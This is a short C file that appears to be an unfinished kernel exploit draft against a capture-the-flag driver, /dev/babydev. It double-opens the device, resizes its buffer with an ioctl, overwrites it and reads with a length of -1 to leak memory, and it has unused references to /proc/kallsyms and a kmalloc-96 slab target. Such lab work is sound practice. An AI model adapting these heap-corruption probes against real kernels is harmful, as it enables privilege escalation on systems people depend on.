#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include "syscalls.h"

#define __NR_kmalloc_overflow_test      59

#define KALLSYMS_NAME                   "/proc/kallsyms"
#define SLAB_NAME                       "kmalloc-96"
#define SLAB_SIZE                       96
#define SLAB_NUM                        100

#define IPCMNI                          32768
#define EIDRM                           43
#define HDRLEN_KMALLOC                  8

int main(){
    char buf[0x30] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char buf2[0x30] = "123";
    char buf3[0x30] = "1234567890";
    // memset(buf,"A",0x30);
    // *((void**)(buf + 20)) = 0x42424242;
    int fd = open("/dev/babydev",O_RDWR);
    int fd2 = open("/dev/babydev",O_RDWR);
    // lseek(fd,16,SEEK_END);
    // close(fd2);
    ioctl(fd,0x10001,0x50);
    write(fd,buf,sizeof(buf));
    
    read(fd,buf3,-1);
    // write(1,buf3,0x30);
    printf("%s",buf3);
    // close(fd)
}